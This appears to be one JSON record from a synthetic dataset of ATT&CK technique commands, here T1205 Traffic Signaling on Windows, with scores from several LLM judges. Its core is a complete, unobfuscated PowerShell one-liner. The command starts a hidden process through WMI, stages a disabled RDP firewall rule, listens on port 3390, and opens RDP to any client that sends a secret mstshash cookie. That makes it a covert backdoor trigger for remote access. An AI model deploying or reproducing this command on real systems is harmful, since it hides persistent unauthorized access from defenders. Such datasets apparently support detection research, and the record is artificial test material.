{
  "technique_id": "T1205",
  "platform": "Windows",
  "shell": "PowerShell",
  "command": "Invoke-WmiMethod -Class Win32_Process -Name Create -ArgumentList 'powershell -NoP -W Hidden -Command & { if (-not (Get-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -Direction Inbound -Action Allow -Protocol TCP -LocalPort 3389 -Enabled False } else { Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -Enabled False }; $l=[System.Net.Sockets.TcpListener]::new([System.Net.IPAddress]::Any,3390); $l.Start(); $c=$l.AcceptTcpClient(); $ns=$c.GetStream(); $buf=New-Object byte[] 2048; $n=$ns.Read($buf,0,$buf.Length); $s=[Text.Encoding]::ASCII.GetString($buf,0,$n); if($s -like ''*Cookie: mstshash=svc-signal*''){ $src=$c.Client.RemoteEndPoint.Address.ToString(); Set-NetFirewallRule -DisplayName ''Signal-Open-RDP-RDPCookie'' -Enabled True -RemoteAddress $src }; $c.Close(); $l.Stop() }'",
  "explanation": "Listens on TCP/3390 and inspects the RDP pre-auth/X.224 negotiation for a 'Cookie: mstshash=svc-signal' marker (application-specific RDP field). When present, it enables the RDP firewall rule for the client IP.",
  "rationale_steps": [
    "Create disabled inbound rule for TCP/3389.",
    "Accept a TCP connection on 3390 and read initial negotiation data.",
    "If the RDP cookie contains the sentinel value, enable RDP for that client."
  ],
  "obfuscation_level": "none",
  "id": "SYN-POWERSHELL-T1205-5411a282-ef0c5333",
  "source_prompt_hash": "5411a282",
  "timestamp_utc": "2025-09-30T03:46:23.408122Z",
  "validation": {
    "syntax_ok": null,
    "llm_judgments": [
      {
        "model": "gpt-5",
        "syntactic_score": 5,
        "syntactic_justification": "Balanced quotes and braces with proper PowerShell escaping, valid cmdlets/parameters, and a single-string -Command & { ... } payload that is parseable by powershell.exe.",
        "semantic_score": 3,
        "semantic_justification": "It correctly implements a covert traffic signal on TCP/3390 and conditionally toggles a firewall rule based on an RDP cookie, but creating/enabling the firewall rule requires administrative rights so the intended effect will likely fail under the stated 'Privilege: None'.",
        "combined_score": 4.0,
        "confidence": 0.8,
        "timestamp": "2025-10-01T13:31:38.434944Z"
      },
      {
        "model": "claude-3-7-sonnet",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed with properly balanced quotes, braces, and parentheses, using correct PowerShell syntax throughout the script block.",
        "semantic_score": 5,
        "semantic_justification": "The command perfectly implements the Traffic Signaling technique by creating a listener that inspects for a specific RDP cookie value and conditionally enables a firewall rule only for clients that provide the correct signal.",
        "combined_score": 5.0,
        "confidence": 0.95,
        "timestamp": "2025-10-01T13:31:41.608246Z"
      },
      {
        "model": "gemini-2.0-flash-thinking-exp",
        "syntactic_score": 5,
        "syntactic_justification": "The command is perfectly well-formed, using correct PowerShell syntax, balanced quotes (including nested escaped single quotes), valid flags, and proper command separation for the complex script block.",
        "semantic_score": 2,
        "semantic_justification": "The command explicitly claims 'Privilege: None,' but its primary objective of creating and modifying firewall rules via `New-NetFirewallRule` and `Set-NetFirewallRule` requires elevated (administrator) privileges, rendering the intended action operationally unachievable under the stated conditions.",
        "combined_score": 3.5,
        "confidence": 1,
        "timestamp": "2025-10-01T13:32:05.689364Z"
      }
    ],
    "llm_average_syntactic": 5.0,
    "llm_average_semantic": 3.333,
    "llm_average_score": 4.167,
    "llm_verdict": "likely_match",
    "sandbox_trace_id": null,
    "mitre_match_score": null
  }
}